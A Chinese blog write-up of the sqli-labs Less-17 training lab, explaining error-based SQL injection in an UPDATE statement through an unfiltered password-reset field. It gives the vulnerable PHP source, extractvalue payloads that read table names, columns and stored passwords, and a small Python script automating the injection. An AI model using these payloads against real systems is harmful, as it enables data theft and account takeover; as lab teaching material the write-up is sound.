---
layout: post
title: sqli-labs - Less-17 POST 报错注入（UPDATE 语句 / 密码重置）Writeup
platform: sqli-labs
date: 2026-11-10 08:10:00 +0800
categories: CTF
---

sqli-labs - Less-17 POST 报错注入（UPDATE 语句 / 密码重置）Writeup

一、题目信息

- 平台：sqli-labs（本地搭建）
- 关卡：Less-17 → POST - Update Query - Error Based - String（密码重置 + UPDATE 注入）
- 地址：`http://127.0.0.1:8080/Less-17/`
- 题型：Web / SQL 注入
- 考点：**UPDATE 语句里的报错注入：注入点在『新密码』参数**

**环境信息**：

```text
PHP 7.3.4（php -S 127.0.0.1:8080 内置服务器）
MySQL 5.7.26（独立数据目录）
sqli-labs 源码：工作区 sqli-labs/
数据库 security（users 表 8 条数据）
```

**✅ 实测结果**

```text
uname=admin & passwd=1
    → 页面提示密码重置成功，【密码真的被改成了 1】★ 副作用！
uname=admin & passwd=1' and extractvalue(1,concat(0x7e,database())) #
    → XPATH syntax error: '~security'
```

二、题目分析

**① 源码**

```php
$uname = check_input($_POST['uname']);      // 用户名做了 check_input（加引号+转义）
$passwd = $_POST['passwd'];                 // ★ 密码没过滤

$sql = "UPDATE users SET password='$passwd' WHERE username='$uname'";
```

**② 为什么这关注入点在密码**

```text
username 走了 check_input() → 被转义 + 加引号 → 注入不了
password 直接拼进 SQL   → 注入点在这里
★ 这是"开发者只防了一半"的典型
```

**③ UPDATE 语句怎么回显数据**

```text
UPDATE 没有查询结果 → 不能用 UNION 回显
→ 只能用报错注入（extractvalue），让 UPDATE 执行时报错
★ 注意：UPDATE 会真的改数据！
   本机实测把 admin 密码改成了 1，后面记得改回来
```

三、解题步骤

**第一步：正常重置（看清副作用）**

```text
uname = admin
passwd = 1
→ 提示成功，然后 users 表里 admin 的密码真的变成 1
★ 所以测这关要小心，先用非关键账号，或测完改回来
```

**第二步：报错注入爆库**

```text
uname = admin
passwd = 1' and extractvalue(1,concat(0x7e,database())) #
→ XPATH syntax error: '~security'
```

**第三步：爆表 / 爆字段 / 爆数据**

```text
passwd = 1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #
passwd = 1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'))) #
passwd = 1' and extractvalue(1,concat(0x7e,(select group_concat(password) from users limit 0,1))) #
```

**第四步：脚本**

```python
import requests, re

url = "http://127.0.0.1:8080/Less-17/"

def inj(passwd):
    r = requests.post(url, data={"uname": "admin", "passwd": passwd, "submit": "Submit"}, timeout=10)
    m = re.search(r"XPATH syntax error: '([^']*)'", r.text)
    return m.group(1) if m else None

print(inj("1' and extractvalue(1,concat(0x7e,database())) #"))   # ~security
```

**第五步：测完把密码改回来**

```sql
UPDATE users SET password='admin' WHERE id=8;
```

四、延伸知识

**① UPDATE / INSERT / DELETE 也能注入**

```text
UPDATE：SET 子句、WHERE 子句都可能注入
INSERT：VALUES 里每个字段都可能注入（Less-18 就是）
DELETE：WHERE 子句
★ 只要能拼 SQL，就能注入 —— 不限于 SELECT
```

**② 没有查询结果怎么写回显**

```text
· 报错注入（extractvalue / updatexml）      ← 本关
· 时间盲注（sleep）
· 外带（into outfile / 写文件）
```

**③ 这一关的真实危害**

```text
注入点在"重置密码"功能上 → 攻击者可以：
  · 把任意用户的密码改成自己知道的
  · 用报错注入把全库数据读出来
★ 比 SELECT 注入更危险，因为它直接改数据
```

五、总结

- **本题核心：注入点在 UPDATE 的密码字段（用户名被 check_input 保护了），只能用报错注入回显。**

- 三步方法论：

```text
① 找注入点：username 被过滤 → 只能打 passwd
② UPDATE 没结果集 → 用 extractvalue 报错注入
③ 注意副作用：UPDATE 真的会改数据，测完要改回来
```

- **三个必记要点**：

```text
① 过滤一半最危险：username 防住了，passwd 没防
② 非 SELECT 语句用报错注入/时间盲注
③ 测 UPDATE 注入前先备份数据
```

**一句话记忆**：

```
┌──────────────────────────────────────────────────────────────┐
│  Less-17：密码重置功能 → UPDATE 注入                          │
│                                                              │
│  注入点：passwd（username 被 check_input 保护了）              │
│  回显：UPDATE 没有结果集 → 只能报错注入                        │
│      passwd = 1' and extractvalue(1,concat(0x7e,database())) #│
│                                                              │
│  ★ 副作用：这关会真的改密码，测完记得改回来                     │
└──────────────────────────────────────────────────────────────┘
```
